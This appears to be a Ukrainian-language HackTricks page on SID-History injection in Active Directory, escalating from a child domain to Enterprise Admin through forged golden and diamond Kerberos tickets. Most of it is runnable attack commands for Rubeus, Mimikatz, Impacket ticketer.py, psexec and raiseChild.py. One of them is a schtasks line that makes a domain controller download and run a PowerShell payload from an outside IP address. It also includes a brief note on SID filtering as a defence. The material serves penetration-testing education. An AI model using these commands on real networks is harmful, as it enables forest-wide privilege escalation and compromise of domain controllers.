# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

Основна мета **атаки на ін'єкцію SID-історії** полягає в допомозі **міграції користувачів між доменами**, забезпечуючи при цьому безперервний доступ до ресурсів з попереднього домену. Це досягається шляхом **включення попереднього ідентифікатора безпеки (SID) користувача в SID-історію** їх нового облікового запису. Варто зазначити, що цей процес може бути маніпульований для надання несанкціонованого доступу шляхом додавання SID групи з високими привілеями (такої як Enterprise Admins або Domain Admins) з батьківського домену до SID-історії. Це експлуатація надає доступ до всіх ресурсів у батьківському домені.

Існує два методи для виконання цієї атаки: через створення або **Золотого Квитка**, або **Діамантового Квитка**.

Щоб визначити SID для групи **"Enterprise Admins"**, спочатку потрібно знайти SID кореневого домену. Після ідентифікації SID групи Enterprise Admins можна побудувати, додавши `-519` до SID кореневого домену. Наприклад, якщо SID кореневого домену `S-1-5-21-280534878-1496970234-700767426`, то результатом буде SID для групи "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.

Ви також можете використовувати групи **Domain Admins**, які закінчуються на **512**.

Ще один спосіб знайти SID групи з іншого домену (наприклад, "Domain Admins") це:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Зверніть увагу, що можливе відключення історії SID у відносинах довіри, що призведе до невдачі цієї атаки.

Згідно з [**документацією**](https://technet.microsoft.com/library/cc835085.aspx):
- **Відключення SIDHistory на лісових довірах** за допомогою інструменту netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Застосування SID Filter Quarantining до зовнішніх довір** за допомогою інструменту netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Застосування SID Filtering до доменних довір у межах одного лісу** не рекомендується, оскільки це непідтримувана конфігурація і може призвести до руйнівних змін. Якщо домен у лісі є ненадійним, то він не повинен бути членом лісу. У цій ситуації необхідно спочатку розділити довірені та ненадійні домени на окремі ліси, де можна застосувати SID Filtering до міжлісової довіри.

Перегляньте цей пост для отримання додаткової інформації про обхід цього: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

Останнього разу, коли я пробував це, мені потрібно було додати аргумент **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Золотий квиток (Mimikatz) з KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Для отримання додаткової інформації про золоті квитки перевірте:

{{#ref}}
golden-ticket.md
{{#endref}}


Для отримання додаткової інформації про діамантові квитки перевірте:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Ескалювати до DA кореневого або Enterprise адміністратора, використовуючи хеш KRBTGT скомпрометованого домену:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
З отриманими дозволами від атаки ви можете виконати, наприклад, атаку DCSync у новому домені:

{{#ref}}
dcsync.md
{{#endref}}

### З linux

#### Вручну з [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Автоматичний за допомогою [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Це скрипт Impacket, який **автоматизує підвищення з дочірнього домену до батьківського**. Скрипт потребує:

- Цільовий контролер домену
- Облікові дані для адміністратора в дочірньому домені

Процес:

- Отримує SID для групи Enterprise Admins батьківського домену
- Отримує хеш для облікового запису KRBTGT в дочірньому домені
- Створює Золотий Квиток
- Увійти в батьківський домен
- Отримує облікові дані для облікового запису адміністратора в батьківському домені
- Якщо вказано перемикач `target-exec`, він автентифікується до контролера домену батьківського домену через Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Посилання

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
